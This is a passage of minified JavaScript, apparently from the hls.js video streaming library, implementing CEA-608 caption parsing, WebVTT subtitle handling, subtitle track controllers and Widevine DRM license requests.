n=this.cmdHistory;if(!((20===t||28===t||21===t||29===t)&&r>=32&&r<=47)&&!((23===t||31===t)&&r>=33&&r<=35))return!1;if(xr(t,r,n))return E(null,null,n),this.logger.log(p.DEBUG,"Repeated command ("+g([t,r])+") is dropped"),!0;var s=20===t||21===t||23===t?1:2,o=this.channels[s];return 20===t||21===t||28===t||29===t?32===r?o.ccRCL():33===r?o.ccBS():34===r?o.ccAOF():35===r?o.ccAON():36===r?o.ccDER():37===r?o.ccRU(2):38===r?o.ccRU(3):39===r?o.ccRU(4):40===r?o.ccFON():41===r?o.ccRDC():42===r?o.ccTR():43===r?o.ccRTD():44===r?o.ccEDM():45===r?o.ccCR():46===r?o.ccENM():47===r&&o.ccEOC():o.ccTO(r-32),E(t,r,n),this.currentChannel=s,!0},t.parseMidrow=function e(t,r){var n=0;if((17===t||25===t)&&r>=32&&r<=47){if((n=17===t?1:2)!==this.currentChannel)return this.logger.log(p.ERROR,"Mismatch channel in midrow parsing"),!1;var i=this.channels[n];return!!i&&(i.ccMIDROW(r),this.logger.log(p.DEBUG,"MIDROW ("+g([t,r])+")"),!0)}return!1},t.parsePAC=function e(t,r){var n,i=this.cmdHistory;if(!((t>=17&&t<=23||t>=25&&t<=31)&&r>=64&&r<=127)&&!((16===t||24===t)&&r>=64&&r<=95))return!1;if(xr(t,r,i))return E(null,null,i),!0;var o=t<=23?1:2;n=r>=64&&r<=95?1===o?_r[t]:Sr[t]:1===o?Tr[t]:Cr[t];var l=this.channels[o];return!!l&&(l.setPAC(this.interpretPAC(n,r)),E(t,r,i),this.currentChannel=o,!0)},t.interpretPAC=function e(t,r){var n=r,i={color:null,italics:!1,indent:null,underline:!1,row:t};return n=r>95?r-96:r-64,i.underline=!(1&~n),n<=13?i.color=["white","green","blue","cyan","red","yellow","magenta","white"][Math.floor(n/2)]:n<=15?(i.italics=!0,i.color="white"):i.indent=4*Math.floor((n-16)/2),i},t.parseChars=function e(t,r){var n,i=null,a=null;if(t>=25?(n=2,a=t-8):(n=1,a=t),a>=17&&a<=19){var s=r;s=17===a?r+80:18===a?r+112:r+144,this.logger.log(p.INFO,"Special char '"+kr(s)+"' in channel "+n),i=[s]}else t>=32&&t<=127&&(i=0===r?[t]:[t,r]);if(i){var o=g(i);this.logger.log(p.DEBUG,"Char codes =  "+o.join(",")),E(t,r,this.cmdHistory)}return i},t.parseBackgroundAttributes=function e(t,r){var a;if(!((16===t||24===t)&&r>=32&&r<=47)&&!((23===t||31===t)&&r>=45&&r<=47))return!1;var s={};16===t||24===t?(a=Math.floor((r-32)/2),s.background=Rr[a],r%2==1&&(s.background=s.background+"_semi")):45===r?s.background="transparent":(s.foreground="black",47===r&&(s.underline=!0));var o=t<=23?1:2;return this.channels[o].setBkgData(s),E(t,r,this.cmdHistory),!0},t.reset=function e(){for(var t=0;t<Object.keys(this.channels).length;t++){var r=this.channels[t];r&&r.reset()}this.cmdHistory={a:null,b:null}},t.cueSplitAtTime=function e(t){for(var r=0;r<this.channels.length;r++){var n=this.channels[r];n&&n.cueSplitAtTime(t)}},e}();function E(e,t,r){r.a=e,r.b=t}function xr(e,t,r){return r.a===e&&r.b===t}var Fr=Nr,b=function(){function e(e,t){this.timelineController=void 0,this.cueRanges=[],this.trackName=void 0,this.startTime=null,this.endTime=null,this.screen=null,this.timelineController=e,this.trackName=t}var t=e.prototype;return t.dispatchCue=function e(){null!==this.startTime&&(this.timelineController.addCues(this.trackName,this.startTime,this.endTime,this.screen,this.cueRanges),this.startTime=null)},t.newCue=function e(t,r,n){(null===this.startTime||this.startTime>t)&&(this.startTime=t),this.endTime=r,this.screen=n,this.timelineController.createCaptionsTrack(this.trackName)},t.reset=function e(){this.cueRanges=[]},e}(),Br=function e(t,r,n){return t.substr(n||0,r.length)===r},jr=function e(t){for(var e=5381,r=t.length;r;)e=33*e^t.charCodeAt(--r);return(e>>>0).toString()},Gr={parse:function e(t,r,n,i,a,s){var p,l=Object(gt.utf8ArrayToStr)(new Uint8Array(t)).trim().replace(/\r\n|\n\r|\n|\r/g,"\n").split("\n"),u="00:00.000",c=0,d=0,f=0,h=[],v=!0,g=!1,A=new yr;A.oncue=function(e){var t=n[i],r=n.ccOffset;t&&t.new&&(void 0!==d?r=n.ccOffset=t.start:function e(t,r,n){var i=t[r],a=t[i.prevCC];if(!a||!a.new&&i.new)return t.ccOffset=t.presentationOffset=i.start,void(i.new=!1);for(;a&&a.new;)t.ccOffset+=i.start-a.start,i.new=!1,a=t[(i=a).prevCC];t.presentationOffset=n}(n,i,f)),f&&(r=f-n.presentationOffset),g&&(e.startTime+=r-d,e.endTime+=r-d),e.id=jr(e.startTime.toString())+jr(e.endTime.toString())+jr(e.text),e.text=decodeURIComponent(encodeURIComponent(e.text)),e.endTime>0&&h.push(e)},A.onparsingerror=function(e){p=e},A.onflush=function(){p&&s?s(p):a(h)},l.forEach((function(e){if(v){if(Br(e,"X-TIMESTAMP-MAP=")){v=!1,g=!0,e.substr(16).split(",").forEach((function(e){Br(e,"LOCAL:")?u=e.substr(6):Br(e,"MPEGTS:")&&(c=parseInt(e.substr(7)))}));try{r+(9e4*n[i].start||0)<0&&(r+=8589934592),c-=r,d=function e(t){var r=parseInt(t.substr(-3)),n=parseInt(t.substr(-6,2)),i=parseInt(t.substr(-9,2)),a=t.length>9?parseInt(t.substr(0,t.indexOf(":"))):0;if(!(Object(x.isFiniteNumber)(r)&&Object(x.isFiniteNumber)(n)&&Object(x.isFiniteNumber)(i)&&Object(x.isFiniteNumber)(a)))throw Error("Malformed X-TIMESTAMP-MAP: Local:"+t);return r+=1e3*n,r+=6e4*i,r+36e5*a}(u)/1e3,f=c/9e4}catch(e){g=!1,p=e}return}""===e&&(v=!1)}A.parse(e+"\n")})),A.flush()}},Kr=Gr;function k(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}var Hr=function(s){function e(e){var t;if((t=s.call(this,e,M.default.MEDIA_ATTACHING,M.default.MEDIA_DETACHING,M.default.FRAG_PARSING_USERDATA,M.default.FRAG_DECRYPTED,M.default.MANIFEST_LOADING,M.default.MANIFEST_LOADED,M.default.FRAG_LOADED,M.default.INIT_PTS_FOUND)||this).media=null,t.config=void 0,t.enabled=!0,t.Cues=void 0,t.textTracks=[],t.tracks=[],t.initPTS=[],t.unparsedVttFrags=[],t.captionsTracks={},t.nonNativeCaptionsTracks={},t.captionsProperties=void 0,t.cea608Parser1=void 0,t.cea608Parser2=void 0,t.lastSn=-1,t.prevCC=-1,t.vttCCs={ccOffset:0,presentationOffset:0,0:{start:0,prevCC:-1,new:!1}},t.hls=e,t.config=e.config,t.Cues=e.config.cueHandler,t.captionsProperties={textTrack1:{label:t.config.captionsTextTrack1Label,languageCode:t.config.captionsTextTrack1LanguageCode},textTrack2:{label:t.config.captionsTextTrack2Label,languageCode:t.config.captionsTextTrack2LanguageCode},textTrack3:{label:t.config.captionsTextTrack3Label,languageCode:t.config.captionsTextTrack3LanguageCode},textTrack4:{label:t.config.captionsTextTrack4Label,languageCode:t.config.captionsTextTrack4LanguageCode}},t.config.enableCEA708Captions){var r=new b(k(t),"textTrack1"),n=new b(k(t),"textTrack2"),i=new b(k(t),"textTrack3"),a=new b(k(t),"textTrack4");t.cea608Parser1=new Fr(1,r,n),t.cea608Parser2=new Fr(3,i,a)}return t}!function Yr(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,s);var t=e.prototype;return t.addCues=function e(t,r,n,i,a){for(var s=!1,o=a.length;o--;){var l=a[o],u=$r(l[0],l[1],r,n);if(u>=0&&(l[0]=Math.min(l[0],r),l[1]=Math.max(l[1],n),s=!0,u/(n-r)>.5))return}if(s||a.push([r,n]),this.config.renderTextTracksNatively)this.Cues.newCue(this.captionsTracks[t],r,n,i);else{var c=this.Cues.newCue(null,r,n,i);this.hls.trigger(M.default.CUES_PARSED,{type:"captions",cues:c,track:t})}},t.onInitPtsFound=function e(t){var r=this,n=t.frag,i=t.id,a=t.initPTS,s=this.unparsedVttFrags;"main"===i&&(this.initPTS[n.cc]=a),s.length&&(this.unparsedVttFrags=[],s.forEach((function(e){r.onFragLoaded(e)})))},t.getExistingTrack=function e(t){var r=this.media;if(r)for(var n=0;n<r.textTracks.length;n++){var i=r.textTracks[n];if(i[t])return i}return null},t.createCaptionsTrack=function e(t){this.config.renderTextTracksNatively?this.createNativeTrack(t):this.createNonNativeTrack(t)},t.createNativeTrack=function e(t){if(!this.captionsTracks[t]){var r=this.captionsProperties,n=this.captionsTracks,i=this.media,a=r[t],s=a.label,o=a.languageCode,l=this.getExistingTrack(t);if(l)n[t]=l,c(n[t]),At(n[t],i);else{var u=this.createTextTrack("captions",s,o);u&&(u[t]=!0,n[t]=u)}}},t.createNonNativeTrack=function e(t){if(!this.nonNativeCaptionsTracks[t]){var r=this.captionsProperties[t];if(r){var i={_id:t,label:r.label,kind:"captions",default:!!r.media&&!!r.media.default,closedCaptions:r.media};this.nonNativeCaptionsTracks[t]=i,this.hls.trigger(M.default.NON_NATIVE_TEXT_TRACKS_FOUND,{tracks:[i]})}}},t.createTextTrack=function e(t,r,n){var i=this.media;if(i)return i.addTextTrack(t,r,n)},t.destroy=function e(){s.prototype.destroy.call(this)},t.onMediaAttaching=function e(t){this.media=t.media,this._cleanTracks()},t.onMediaDetaching=function e(){var t=this.captionsTracks;Object.keys(t).forEach((function(e){c(t[e]),delete t[e]})),this.nonNativeCaptionsTracks={}},t.onManifestLoading=function e(){this.lastSn=-1,this.prevCC=-1,this.vttCCs={ccOffset:0,presentationOffset:0,0:{start:0,prevCC:-1,new:!1}},this._cleanTracks(),this.tracks=[],this.captionsTracks={},this.nonNativeCaptionsTracks={}},t._cleanTracks=function e(){var t=this.media;if(t){var r=t.textTracks;if(r)for(var n=0;n<r.length;n++)c(r[n])}},t.onManifestLoaded=function e(t){var a=this;if(this.textTracks=[],this.unparsedVttFrags=this.unparsedVttFrags||[],this.initPTS=[],this.cea608Parser1&&this.cea608Parser2&&(this.cea608Parser1.reset(),this.cea608Parser2.reset()),this.config.enableWebVTT){var r=t.subtitles||[],n=this.tracks&&r&&this.tracks.length===r.length;if(this.tracks=t.subtitles||[],this.config.renderTextTracksNatively){var s=this.media?this.media.textTracks:[];this.tracks.forEach((function(e,t){var r;if(t<s.length){for(var n=null,i=0;i<s.length;i++)if(zr(s[i],e)){n=s[i];break}n&&(r=n)}r||(r=a.createTextTrack("subtitles",e.name,e.lang)),e.default?r.mode=a.hls.subtitleDisplay?"showing":"hidden":r.mode="disabled",a.textTracks.push(r)}))}else if(!n&&this.tracks&&this.tracks.length){var i=this.tracks.map((function(e){return{label:e.name,kind:e.type.toLowerCase(),default:e.default,subtitleTrack:e}}));this.hls.trigger(M.default.NON_NATIVE_TEXT_TRACKS_FOUND,{tracks:i})}}this.config.enableCEA708Captions&&t.captions&&t.captions.forEach((function(e){var t=/(?:CC|SERVICE)([1-4])/.exec(e.instreamId);if(t){var r="textTrack"+t[1],n=a.captionsProperties[r];n&&(n.label=e.name,e.lang&&(n.languageCode=e.lang),n.media=e)}}))},t.onFragLoaded=function e(t){var r=t.frag,n=t.payload,i=this.cea608Parser1,a=this.cea608Parser2,s=this.initPTS,o=this.lastSn,l=this.unparsedVttFrags;if("main"===r.type){var u=r.sn;r.sn!==o+1&&i&&a&&(i.reset(),a.reset()),this.lastSn=u}else if("subtitle"===r.type)if(n.byteLength){if(!Object(x.isFiniteNumber)(s[r.cc]))return l.push(t),void(s.length&&this.hls.trigger(M.default.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:r}));var c=r.decryptdata;null!=c&&null!=c.key&&"AES-128"===c.method||this._parseVTTs(r,n)}else this.hls.trigger(M.default.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:r})},t._parseVTTs=function e(r,t){var i=this,a=this.hls,n=this.prevCC,s=this.textTracks,o=this.vttCCs;o[r.cc]||(o[r.cc]={start:r.start,prevCC:n,new:!0},this.prevCC=r.cc),Kr.parse(t,this.initPTS[r.cc],o,r.cc,(function(e){if(i.config.renderTextTracksNatively){var n=s[r.level];if("disabled"===n.mode)return void a.trigger(M.default.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:r});e.forEach((function(t){if(!n.cues.getCueById(t.id))try{if(n.addCue(t),!n.cues.getCueById(t.id))throw new Error("addCue is failed for: "+t)}catch(e){F.logger.debug("Failed occurred on adding cues: "+e);var r=new window.TextTrackCue(t.startTime,t.endTime,t.text);r.id=t.id,n.addCue(r)}}))}else{var t=i.tracks[r.level].default?"default":"subtitles"+r.level;a.trigger(M.default.CUES_PARSED,{type:"subtitles",cues:e,track:t})}a.trigger(M.default.SUBTITLE_FRAG_PROCESSED,{success:!0,frag:r})}),(function(e){F.logger.log("Failed to parse VTT cue: "+e),a.trigger(M.default.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:r})}))},t.onFragDecrypted=function e(t){var r=t.frag,n=t.payload;if("subtitle"===r.type){if(!Object(x.isFiniteNumber)(this.initPTS[r.cc]))return void this.unparsedVttFrags.push(t);this._parseVTTs(r,n)}},t.onFragParsingUserdata=function e(t){var r=this.cea608Parser1,n=this.cea608Parser2;if(this.enabled&&r&&n)for(var i=0;i<t.samples.length;i++){var a=t.samples[i].bytes;if(a){var s=this.extractCea608Data(a);r.addData(t.samples[i].pts,s[0]),n.addData(t.samples[i].pts,s[1])}}},t.extractCea608Data=function e(t){for(var r=31&t[0],n=2,i=[[],[]],a=0;a<r;a++){var s=t[n++],o=127&t[n++],l=127&t[n++],c=3&s;0===o&&0===l||!!(4&s)&&(0!==c&&1!==c||(i[c].push(o),i[c].push(l)))}return i},e}(i);function zr(e,t){return e&&e.label===t.name&&!(e.textTrack1||e.textTrack2)}function $r(e,t,r,n){return Math.min(t,n)-Math.max(e,r)}var qr=Hr;function Xr(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Jr=function(r){function e(e){var t;return(t=r.call(this,e,M.default.MEDIA_ATTACHED,M.default.MEDIA_DETACHING,M.default.MANIFEST_LOADED,M.default.SUBTITLE_TRACK_LOADED)||this).tracks=[],t.trackId=-1,t.media=null,t.stopped=!0,t.subtitleDisplay=!0,t.queuedDefaultTrack=null,t}!function Qr(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,r);var t=e.prototype;return t.destroy=function e(){i.prototype.destroy.call(this)},t.onMediaAttached=function e(t){var r=this;this.media=t.media,this.media&&(Object(x.isFiniteNumber)(this.queuedDefaultTrack)&&(this.subtitleTrack=this.queuedDefaultTrack,this.queuedDefaultTrack=null),this.trackChangeListener=this._onTextTracksChanged.bind(this),this.useTextTrackPolling=!(this.media.textTracks&&"onchange"in this.media.textTracks),this.useTextTrackPolling?this.subtitlePollingInterval=setInterval((function(){r.trackChangeListener()}),500):this.media.textTracks.addEventListener("change",this.trackChangeListener))},t.onMediaDetaching=function e(){this.media&&(this.useTextTrackPolling?clearInterval(this.subtitlePollingInterval):this.media.textTracks.removeEventListener("change",this.trackChangeListener),Object(x.isFiniteNumber)(this.subtitleTrack)&&(this.queuedDefaultTrack=this.subtitleTrack),en(this.media.textTracks).forEach((function(e){c(e)})),this.subtitleTrack=-1,this.media=null)},t.onManifestLoaded=function e(t){var r=this,n=t.subtitles||[];this.tracks=n,this.hls.trigger(M.default.SUBTITLE_TRACKS_UPDATED,{subtitleTracks:n}),n.forEach((function(e){e.default&&(r.media?r.subtitleTrack=e.id:r.queuedDefaultTrack=e.id)}))},t.onSubtitleTrackLoaded=function e(t){var r=this,n=t.id,i=t.details,a=this.trackId,s=this.tracks,o=s[a];if(n>=s.length||n!==a||!o||this.stopped)this._clearReloadTimer();else if(F.logger.log("subtitle track "+n+" loaded"),i.live){var l=Me(o.details,i,t.stats.trequest);F.logger.log("Reloading live subtitle playlist in "+l+"ms"),this.timer=setTimeout((function(){r._loadCurrentTrack()}),l)}else this._clearReloadTimer()},t.startLoad=function e(){this.stopped=!1,this._loadCurrentTrack()},t.stopLoad=function e(){this.stopped=!0,this._clearReloadTimer()},t._clearReloadTimer=function e(){this.timer&&(clearTimeout(this.timer),this.timer=null)},t._loadCurrentTrack=function e(){var t=this.trackId,r=this.tracks,n=this.hls,i=r[t];t<0||!i||i.details&&!i.details.live||(F.logger.log("Loading subtitle track "+t),n.trigger(M.default.SUBTITLE_TRACK_LOADING,{url:i.url,id:t}))},t._toggleTrackModes=function e(t){var r=this.media,n=this.subtitleDisplay,i=this.trackId;if(r){var a=en(r.textTracks);if(-1===t)[].slice.call(a).forEach((function(e){e.mode="disabled"}));else{var s=a[i];s&&(s.mode="disabled")}var o=a[t];o&&(o.mode=n?"showing":"hidden")}},t._setSubtitleTrackInternal=function e(t){var r=this.hls,n=this.tracks;!Object(x.isFiniteNumber)(t)||t<-1||t>=n.length||(this.trackId=t,F.logger.log("Switching to subtitle track "+t),r.trigger(M.default.SUBTITLE_TRACK_SWITCH,{id:t}),this._loadCurrentTrack())},t._onTextTracksChanged=function e(){if(this.media&&this.hls.config.renderTextTracksNatively){for(var t=-1,r=en(this.media.textTracks),n=0;n<r.length;n++)if("hidden"===r[n].mode)t=n;else if("showing"===r[n].mode){t=n;break}this.subtitleTrack=t}},function Zr(e,t,r){return t&&Xr(e.prototype,t),r&&Xr(e,r),e}(e,[{key:"subtitleTracks",get:function e(){return this.tracks}},{key:"subtitleTrack",get:function e(){return this.trackId},set:function e(t){this.trackId!==t&&(this._toggleTrackModes(t),this._setSubtitleTrackInternal(t))}}]),e}(i);function en(e){for(var t=[],r=0;r<e.length;r++){var n=e[r];"subtitles"===n.kind&&n.label&&t.push(e[r])}return t}var tn=Jr,rn=e("./src/crypt/decrypter.js");var _,on=window.performance,un=function(n){function e(e,t){var r;return(r=n.call(this,e,M.default.MEDIA_ATTACHED,M.default.MEDIA_DETACHING,M.default.ERROR,M.default.KEY_LOADED,M.default.FRAG_LOADED,M.default.SUBTITLE_TRACKS_UPDATED,M.default.SUBTITLE_TRACK_SWITCH,M.default.SUBTITLE_TRACK_LOADED,M.default.SUBTITLE_FRAG_PROCESSED,M.default.LEVEL_UPDATED)||this).fragmentTracker=t,r.config=e.config,r.state=K_STOPPED,r.tracks=[],r.tracksBuffered=[],r.currentTrackId=-1,r.decrypter=new rn.default(e,e.config),r.lastAVStart=0,r._onMediaSeeking=r.onMediaSeeking.bind(function nn(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}(r)),r}!function an(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,n);var t=e.prototype;return t.startLoad=function e(){this.stopLoad(),this.state=K_IDLE;var t=this.tracks[this.currentTrackId];t&&t.details&&(this.setInterval(500),this.tick())},t.onSubtitleFragProcessed=function e(t){var r=t.frag,n=t.success;if(this.fragPrevious=r,this.state=K_IDLE,n){var i=this.tracksBuffered[this.currentTrackId];if(i){for(var a,s=r.start,o=0;o<i.length;o++)if(s>=i[o].start&&s<=i[o].end){a=i[o];break}var l=r.start+r.duration;a?a.end=l:(a={start:s,end:l},i.push(a))}}},t.onMediaAttached=function e(t){var r=t.media;this.media=r,r.addEventListener("seeking",this._onMediaSeeking),this.state=K_IDLE},t.onMediaDetaching=function e(){var t=this;this.media&&(this.media.removeEventListener("seeking",this._onMediaSeeking),this.fragmentTracker.removeAllFragments(),this.currentTrackId=-1,this.tracks.forEach((function(e){t.tracksBuffered[e.id]=[]})),this.media=null,this.state=K_STOPPED)},t.onError=function e(t){var r=t.frag;r&&"subtitle"===r.type&&(this.fragCurrent&&this.fragCurrent.loader&&this.fragCurrent.loader.abort(),this.state=K_IDLE)},t.onSubtitleTracksUpdated=function e(t){var r=this;F.logger.log("subtitle tracks updated"),this.tracksBuffered=[],this.tracks=t.subtitleTracks,this.tracks.forEach((function(e){r.tracksBuffered[e.id]=[]}))},t.onSubtitleTrackSwitch=function e(t){if(this.currentTrackId=t.id,this.tracks&&this.tracks.length&&-1!==this.currentTrackId){var r=this.tracks[this.currentTrackId];r&&r.details&&this.setInterval(500)}else this.clearInterval()},t.onSubtitleTrackLoaded=function e(t){var r=t.id,n=t.details,i=this.currentTrackId,a=this.tracks,s=a[i];r>=a.length||r!==i||!s||(n.live&&function Pe(e,t,r){void 0===r&&(r=0);var n=-1;Ne(e,t,(function(e,t,r){t.start=e.start,n=r}));var i=t.fragments;if(n<0)i.forEach((function(e){e.start+=r}));else for(var a=n+1;a<i.length;a++)i[a].start=i[a-1].start+i[a-1].duration}(s.details,n,this.lastAVStart),s.details=n,this.setInterval(500))},t.onKeyLoaded=function e(){this.state===K_KEY_LOADING&&(this.state=K_IDLE)},t.onFragLoaded=function e(t){var r=this.fragCurrent,n=t.frag.decryptdata,i=t.frag,a=this.hls;if(this.state===K_FRAG_LOADING&&r&&"subtitle"===t.frag.type&&r.sn===t.frag.sn&&t.payload.byteLength>0&&n&&n.key&&"AES-128"===n.method){var s=on.now();this.decrypter.decrypt(t.payload,n.key.buffer,n.iv.buffer,(function(e){var t=on.now();a.trigger(M.default.FRAG_DECRYPTED,{frag:i,payload:e,stats:{tstart:s,tdecrypt:t}})}))}},t.onLevelUpdated=function e(t){var n=t.details.fragments;this.lastAVStart=n.length?n[0].start:0},t.doTick=function e(){if(this.media)switch(this.state){case K_IDLE:var t=this.config,r=this.currentTrackId,n=this.fragmentTracker,i=this.media,a=this.tracks;if(!a||!a[r]||!a[r].details)break;var g,s=t.maxBufferHole,o=t.maxFragLookUpTolerance,l=Math.min(t.maxBufferLength,t.maxMaxBufferLength),u=j.bufferedInfo(this._getBuffered(),i.currentTime,s),c=u.end,d=u.len,f=a[r].details,h=f.fragments,p=h.length,v=h[p-1].start+h[p-1].duration;if(d>l)return;var A=this.fragPrevious;c<v?(A&&f.hasProgramDateTime&&(g=$e(h,A.endProgramDateTime,o)),g||(g=We(A,h,c,o))):g=h[p-1],g&&g.encrypted?(F.logger.log("Loading key for "+g.sn),this.state=K_KEY_LOADING,this.hls.trigger(M.default.KEY_LOADING,{frag:g})):g&&n.getState(g)===B_NOT_LOADED&&(this.fragCurrent=g,this.state=K_FRAG_LOADING,this.hls.trigger(M.default.FRAG_LOADING,{frag:g}))}else this.state=K_IDLE},t.stopLoad=function e(){this.lastAVStart=0,this.fragPrevious=null,n.prototype.stopLoad.call(this)},t._getBuffered=function e(){return this.tracksBuffered[this.currentTrackId]||[]},t.onMediaSeeking=function e(){if(this.fragCurrent){var t=this.media?this.media.currentTime:0,r=this.config.maxFragLookUpTolerance,n=this.fragCurrent.start-r,i=this.fragCurrent.start+this.fragCurrent.duration+r;(t<n||t>i)&&(this.fragCurrent.loader&&this.fragCurrent.loader.abort(),this.fragmentTracker.removeFragment(this.fragCurrent),this.fragCurrent=null,this.fragPrevious=null,this.state=K_IDLE,this.tick())}},e}(it);!function(e){e.WIDEVINE="com.widevine.alpha",e.PLAYREADY="com.microsoft.playready"}(_||(_={}));var cn="undefined"!=typeof window&&window.navigator&&window.navigator.requestMediaKeySystemAccess?window.navigator.requestMediaKeySystemAccess.bind(window.navigator):null;function dn(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var An=function(t){function e(e){var n;return(n=t.call(this,e,M.default.MEDIA_ATTACHED,M.default.MEDIA_DETACHED,M.default.MANIFEST_PARSED)||this)._widevineLicenseUrl=void 0,n._licenseXhrSetup=void 0,n._emeEnabled=void 0,n._requestMediaKeySystemAccess=void 0,n._drmSystemOptions=void 0,n._config=void 0,n._mediaKeysList=[],n._media=null,n._hasSetMediaKeys=!1,n._requestLicenseFailureCount=0,n.mediaKeysPromise=null,n._onMediaEncrypted=function(r){if(F.logger.log('Media is encrypted using "'+r.initDataType+'" init data type'),!n.mediaKeysPromise)return F.logger.error("Fatal: Media is encrypted but no CDM access or no keys have been requested"),void n.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.KEY_SYSTEM_ERROR,details:A.ErrorDetails.KEY_SYSTEM_NO_KEYS,fatal:!0});var e=function e(t){n._media&&(n._attemptSetMediaKeys(t),n._generateRequestWithPreferredKeySession(r.initDataType,r.initData))};n.mediaKeysPromise.then(e).catch(e)},n._config=e.config,n._widevineLicenseUrl=n._config.widevineLicenseUrl,n._licenseXhrSetup=n._config.licenseXhrSetup,n._emeEnabled=n._config.emeEnabled,n._requestMediaKeySystemAccess=n._config.requestMediaKeySystemAccessFunc,n._drmSystemOptions=e.config.drmSystemOptions,n}!function hn(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,t);var r=e.prototype;return r.getLicenseServerUrl=function e(t){switch(t){case _.WIDEVINE:if(!this._widevineLicenseUrl)break;return this._widevineLicenseUrl}throw new Error('no license server URL configured for key-system "'+t+'"')},r._attemptKeySystemAccess=function e(t,r,n){var i=this,a=function e(t,r,n,i){if(t===_.WIDEVINE)return function e(t,r,n){var i={audioCapabilities:[],videoCapabilities:[]};return t.forEach((function(e){i.audioCapabilities.push({contentType:'audio/mp4; codecs="'+e+'"',robustness:n.audioRobustness||""})})),r.forEach((function(e){i.videoCapabilities.push({contentType:'video/mp4; codecs="'+e+'"',robustness:n.videoRobustness||""})})),[i]}(r,n,i);throw new Error("Unknown key-system: "+t)}(t,r,n,this._drmSystemOptions);F.logger.log("Requesting encrypted media key-system access");var s=this.requestMediaKeySystemAccess(t,a);this.mediaKeysPromise=s.then((function(e){return i._onMediaKeySystemAccessObtained(t,e)})),s.catch((function(e){F.logger.error('Failed to obtain key-system "'+t+'" access:',e)}))},r._onMediaKeySystemAccessObtained=function e(t,r){var n=this;F.logger.log('Access for key-system "'+t+'" obtained');var i={mediaKeysSessionInitialized:!1,mediaKeySystemAccess:r,mediaKeySystemDomain:t};this._mediaKeysList.push(i);var a=Promise.resolve().then((function(){return r.createMediaKeys()})).then((function(e){return i.mediaKeys=e,F.logger.log('Media-keys created for key-system "'+t+'"'),n._onMediaKeysCreated(),e}));return a.catch((function(e){F.logger.error("Failed to create media-keys:",e)})),a},r._onMediaKeysCreated=function e(){var t=this;this._mediaKeysList.forEach((function(e){e.mediaKeysSession||(e.mediaKeysSession=e.mediaKeys.createSession(),t._onNewMediaKeySession(e.mediaKeysSession))}))},r._onNewMediaKeySession=function e(t){var r=this;F.logger.log("New key-system session "+t.sessionId),t.addEventListener("message",(function(e){r._onKeySessionMessage(t,e.message)}),!1)},r._onKeySessionMessage=function e(t,r){F.logger.log("Got EME message event, creating license request"),this._requestLicense(r,(function(e){F.logger.log("Received license data (length: "+(e?e.byteLength:e)+"), updating key-session"),t.update(e)}))},r._attemptSetMediaKeys=function e(t){if(!this._media)throw new Error("Attempted to set mediaKeys without first attaching a media element");if(!this._hasSetMediaKeys){var r=this._mediaKeysList[0];if(!r||!r.mediaKeys)return F.logger.error("Fatal: Media is encrypted but no CDM access or no keys have been obtained yet"),void this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.KEY_SYSTEM_ERROR,details:A.ErrorDetails.KEY_SYSTEM_NO_KEYS,fatal:!0});F.logger.log("Setting keys for encrypted media"),this._media.setMediaKeys(r.mediaKeys),this._hasSetMediaKeys=!0}},r._generateRequestWithPreferredKeySession=function e(t,r){var n=this,i=this._mediaKeysList[0];if(!i)return F.logger.error("Fatal: Media is encrypted but not any key-system access has been obtained yet"),void this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.KEY_SYSTEM_ERROR,details:A.ErrorDetails.KEY_SYSTEM_NO_ACCESS,fatal:!0});if(i.mediaKeysSessionInitialized)F.logger.warn("Key-Session already initialized but requested again");else{var a=i.mediaKeysSession;if(!a)return F.logger.error("Fatal: Media is encrypted but no key-session existing"),void this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.KEY_SYSTEM_ERROR,details:A.ErrorDetails.KEY_SYSTEM_NO_SESSION,fatal:!0});if(!r)return F.logger.warn("Fatal: initData required for generating a key session is null"),void this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.KEY_SYSTEM_ERROR,details:A.ErrorDetails.KEY_SYSTEM_NO_INIT_DATA,fatal:!0});F.logger.log('Generating key-session request for "'+t+'" init data type'),i.mediaKeysSessionInitialized=!0,a.generateRequest(t,r).then((function(){F.logger.debug("Key-session generation succeeded")})).catch((function(e){F.logger.error("Error generating key-session request:",e),n.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.KEY_SYSTEM_ERROR,details:A.ErrorDetails.KEY_SYSTEM_NO_SESSION,fatal:!1})}))}},r._createLicenseXhr=function e(t,r,n){var i=new XMLHttpRequest,a=this._licenseXhrSetup;try{if(a)try{a(i,t)}catch(e){i.open("POST",t,!0),a(i,t)}i.readyState||i.open("POST",t,!0)}catch(e){throw new Error("issue setting up KeySystem license XHR "+e)}return i.responseType="arraybuffer",i.onreadystatechange=this._onLicenseRequestReadyStageChange.bind(this,i,t,r,n),i},r._onLicenseRequestReadyStageChange=function e(t,r,n,i){if(4===t.readyState)if(200===t.status)this._requestLicenseFailureCount=0,F.logger.log("License request succeeded"),"arraybuffer"!==t.responseType&&F.logger.warn("xhr response type was not set to the expected arraybuffer for license request"),i(t.response);else{if(F.logger.error("License Request XHR failed ("+r+"). Status: "+t.status+" ("+t.statusText+")"),this._requestLicenseFailureCount++,this._requestLicenseFailureCount>3)return void this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.KEY_SYSTEM_ERROR,details:A.ErrorDetails.KEY_SYSTEM_LICENSE_REQUEST_FAILED,fatal:!0});var 